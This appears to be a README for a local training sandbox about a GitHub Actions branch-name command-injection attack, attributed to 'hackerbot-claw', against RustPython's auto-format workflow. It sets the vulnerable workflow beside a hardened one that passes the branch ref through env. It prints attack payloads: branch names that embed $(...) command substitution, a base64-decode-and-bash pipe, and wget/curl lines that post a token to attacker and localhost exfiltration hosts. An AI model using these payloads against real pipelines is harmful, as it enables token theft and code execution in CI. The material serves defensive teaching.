# 🔐 Sandbox 7 - Base64 Branch Name Injection (RustPython/RustPython)

## 📋 Overview

| Property | Value |
|----------|-------|
| **Attack Type** | Base64-encoded payload in branch name via `git push` |
| **Real Target** | RustPython/RustPython (20k+ stars) |
| **Attacker** | hackerbot-claw (Mar 2, 2026) |
| **Trigger** | `pull_request_target` auto-format workflow |
| **Result** | ❌ Partial execution - base64 encoding issue prevented full RCE |
| **Fixed** | ✅ Attack blocked by storing branch ref in `env` variable |

> 💡 **Note:** This is the **most recent attack** in the campaign (Mar 2, 2026).
> It is a variation of Sandbox 3 - but instead of injecting via a comment body,
> the payload is hidden inside a **Git branch name** using Base64 encoding
> to evade simple detection filters.

---

## 📁 Structure
```
sandbox-7-base64-branch/
│
├── vulnerable/                          ← ATTACKED VERSION
│   └── .github/
│       └── workflows/
│           └── pr-auto-commit.yml      ← vulnerable workflow
│
├── fixed/                               ← SECURED VERSION
│   └── .github/
│       └── workflows/
│           └── pr-auto-commit.yml      ← hardened workflow
│
└── attacker/
    └── PAYLOAD_EXPLANATION.md          ← base64 branch name explained
```

---

## 🔄 Attack Flow

### Visual Diagram
```
┌──────────────────────────────────────────────────────────┐
│                      ATTACK FLOW                          │
├──────────────────────────────────────────────────────────┤
│                                                           │
│   1. Attacker creates branch with malicious name:         │
│      main$(wget http://localhost:8888/exfil)              │
│      (real attack used base64 encoding for obfuscation)   │
│                    ↓                                      │
│   2. Attacker opens PR from this branch                   │
│                    ↓                                      │
│   3. pull_request_target trigger fires                    │
│      ⚠️  auto-format workflow runs on every PR            │
│                    ↓                                      │
│   4. Formatter detects changes → has_changes = true       │
│                    ↓                                      │
│   5. Workflow runs:                                       │
│      git push origin HEAD:                                │
│      ${{ github.event.pull_request.head.ref }}            │
│      ⚠️  branch name injected directly into git push      │
│                    ↓                                      │
│   6. bash evaluates $( ) in branch name                   │
│      wget executes → data sent to attacker server         │
│                    ↓                                      │
│   ❌ RCE via branch name command substitution             │
│                                                           │
├──────────────────────────────────────────────────────────┤
│                       THE FIX                             │
├──────────────────────────────────────────────────────────┤
│                                                           │
│   Store branch ref in env variable first                  │
│   env:                                                    │
│     HEAD_REF: ${{ github.event.pull_request.head.ref }}   │
│   git push origin "HEAD:$HEAD_REF"                        │
│   ✅ bash NEVER executes $(...) in variable values        │
│                    ↓                                      │
│   ✅ Attack blocked                                       │
│                                                           │
└──────────────────────────────────────────────────────────┘
```

### Simplified Diagram
```
Branch name: main$(wget http://attacker/exfil)
           ↓
pull_request_target trigger (auto-format workflow)
           ↓
Formatter detects changes → has_changes = true
           ↓
git push origin HEAD:${{ github.event.pull_request.head.ref }}
           ↓                    ↑
bash sees $(...) ──── EXECUTES IT
           ↓
wget → localhost:8888/exfil
           ↓
❌ Data exfiltrated
```

---

## ⚠️ Vulnerability Conditions

Two conditions must be met:
```yaml
# ⚠️ Condition 1: branch name used directly in git push
steps:
  - name: Push formatting changes
    if: steps.check-changes.outputs.has_changes == 'true'
    run: |
      # DANGER: branch name injected directly into git push
      # if branch name contains $(...), bash WILL execute it
      git push origin HEAD:${{ github.event.pull_request.head.ref }}
      #                      ↑
      #          CRITICAL VULNERABILITY HERE

# ⚠️ Condition 2: PAT accessible to the workflow
env:
  GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  # PAT accessible - can be stolen if payload executes
```

---

## 💣 Malicious Payload

### Real Attack (Base64 encoded - for obfuscation)
```bash
# Real branch name used by hackerbot-claw:
main$(echo${IFS}Y3VybC1zLVhQT1NULWQgcGF0PUVYQ...|base64${IFS}-d|bash)
#    ↑
# Base64 decodes to:
# curl -s -X POST -d pat=EXFILTRATED http://attacker-server/exfil
```

### Local Simulation (simplified - direct wget)
```bash
# Branch name used in our sandbox:
main$(wget -q -O- --post-data=pat=EXFILTRATED_TOKEN_ghp_abc123 http://host.docker.internal:8888/exfil)
#    ↑
# bash executes wget when running:
# git push origin HEAD:main$(wget ...)
#                           ↑
# CRITICAL: command substitution executes here
```

> 💡 **Why Base64 encoding?**
> The real attacker used Base64 to **obfuscate** the payload,
> making it harder to detect with simple string matching filters.
> The base64-encoded branch name looks like random text at first glance.

> 🔑 **Comparison with Sandbox 3:**
> - Sandbox 3 → payload in **comment body** → executed via `echo`
> - Sandbox 7 → payload in **branch name** → executed via `git push`
> Same root cause - different trigger point.

---

## 🔒 Why `env` Blocks the Attack

> 💡 **This is the key security concept of this sandbox:**
```
VULNERABLE - branch name evaluated as command:
──────────────────────────────────────────────────
run: |
  git push origin HEAD:${{ github.event.pull_request.head.ref }}
# bash receives:
# git push origin HEAD:main$(wget http://attacker/exfil)
# bash sees $(...) → EXECUTES wget → ❌ RCE


SAFE - branch ref treated as plain text:
──────────────────────────────────────────────────
env:
  HEAD_REF: ${{ github.event.pull_request.head.ref }}
run: |
  git push origin "HEAD:$HEAD_REF"
# bash receives:
# git push origin "HEAD:main$(wget http://attacker/exfil)"
# bash expands $HEAD_REF → plain string value
# $(...) inside quotes with variable → NOT executed → ✅ Safe
```

> 🔑 **The rule:** Always store `${{ }}` expressions in `env` variables first.
> When you reference `$HEAD_REF` in a quoted string,
> bash treats its **value** as plain text - never as a command.

---

## 📄 Event JSON

> 💡 **What is the Event JSON?**
> We use two event files for this sandbox:
> - `event_base64_branch.json` → malicious branch name → vulnerable version
> - `event_base64_branch_fixed.json` → normal branch name → fixed version

**Vulnerable event - malicious branch name:**
```json
{
  "action": "opened",
  "pull_request": {
    "number": 1,
    "head": {
      "sha": "abc123",
      "ref": "main$(wget -q -O- --post-data=pat=EXFILTRATED http://host.docker.internal:8888/exfil)",
      "repo": {
        "full_name": "attacker/repo-fork"
      }
    },
    "base": {
      "repo": {
        "full_name": "owner/repo"
      }
    }
  }
}
```

**Fixed event - normal branch name:**
```json
{
  "action": "opened",
  "pull_request": {
    "number": 1,
    "head": {
      "sha": "abc123",
      "ref": "main",
      "repo": {
        "full_name": "owner/repo"
      }
    }
  }
}
```

---

## 🧪 Local Demonstration

> ⚠️ **Safety Disclaimer:**
> This demonstration runs **entirely locally** using `act` and Docker.
> `localhost:8888` is a **simulated exfiltration server** on your own machine.
> **No real data is sent anywhere outside your machine.**
> Never run these attacks against real repositories without explicit authorization.

### Step 1 - Start exfiltration server
```bash
# Terminal 2 - keep this running
python exfil_server.py

# Expected output:
# Exfiltration server running on port 8888...
```

### Step 2 ❌ - Run Vulnerable Version
```bash
# Terminal 1
act pull_request_target \
    --eventpath event_base64_branch.json \
    --secret-file .secrets \
    -W sandbox-7-base64-branch/vulnerable/.github/workflows/pr-auto-commit.yml \
    -P ubuntu-latest=catthehacker/ubuntu:act-latest \
    -s GITHUB_TOKEN=$token
```

**Terminal 1 - victim sees normal formatter output:**
```
✅ Success - Main Run formatter
| Running formatter...
| Formatting complete
✅ Success - Main Check for changes
✅ Success - Main Push formatting changes
| Pushing changes to branch...
🏁 Job succeeded
```

**Terminal 2 - attacker receives the data:**
```
==================================================
TOKEN EXFILTRATED!
Data: pat=EXFILTRATED_TOKEN_ghp_abc123
==================================================
❌ Attack succeeded - branch name injection executed
```

### Step 3 ✅ - Run Fixed Version
```bash
act pull_request_target \
    --eventpath event_base64_branch_fixed.json \
    --secret-file .secrets \
    -W sandbox-7-base64-branch/fixed/.github/workflows/pr-auto-commit.yml \
    -P ubuntu-latest=catthehacker/ubuntu:act-latest \
    -s GITHUB_TOKEN=$token
```

**Terminal 1 - workflow runs safely:**
```
✅ Success - Main Run formatter
| Running formatter...
| Formatting complete
✅ Success - Main Push formatting changes safely
| Pushing changes safely...
🏁 Job succeeded
```

**Terminal 2:**
```
(no request received)
✅ Attack blocked - branch name treated as plain text
```

---

## 🛠️ Applied Fix

| Element | ❌ Vulnerable | ✅ Fixed |
|---------|-------------|---------|
| Branch ref | `${{ }}` directly in `git push` | Stored in `env` variable |
| Bash evaluation | `$(...)` in branch name executed | Treated as plain text |
| Token exposure | `GITHUB_TOKEN` in env | Not exposed |
| Quoting | Unquoted branch ref | Properly quoted `"HEAD:$HEAD_REF"` |
```yaml
# ✅ FIXED WORKFLOW
steps:
  - name: Push formatting changes safely
    if: steps.check-changes.outputs.has_changes == 'true'
    env:
      # ✅ store branch ref in env variable first
      HEAD_REF: ${{ github.event.pull_request.head.ref }}
    run: |
      # ✅ branch name treated as plain text
      # $(...) inside HEAD_REF is NEVER executed
      git push origin "HEAD:$HEAD_REF"
```

---

## 🔑 Key Lesson

> ⚠️ **Never interpolate `${{ }}` expressions directly inside `git` commands.**
>
> Branch names are **fully attacker-controlled** - they can contain
> any characters including `$(...)` command substitution payloads.
> When used directly in a `git push` command, bash will execute them.
>
> ✅ **Rule 1:** Always store branch refs in `env` variables first.
>
> ✅ **Rule 2:** Always quote the variable: `"HEAD:$HEAD_REF"` - not `HEAD:$HEAD_REF`.
>
> ✅ **Rule 3:** Treat branch names like filenames -
> they are **untrusted user input**.
>
> 🔑 **Remember:** Base64 encoding is just obfuscation -
> it does not change the fundamental vulnerability.
> The fix is the same regardless of encoding.

---

## 🔗 References

- [Real attack analysis - StepSecurity](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)
- [GitHub Actions expression injection](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)
- [act - Local GitHub Actions runner](https://github.com/nektos/act)
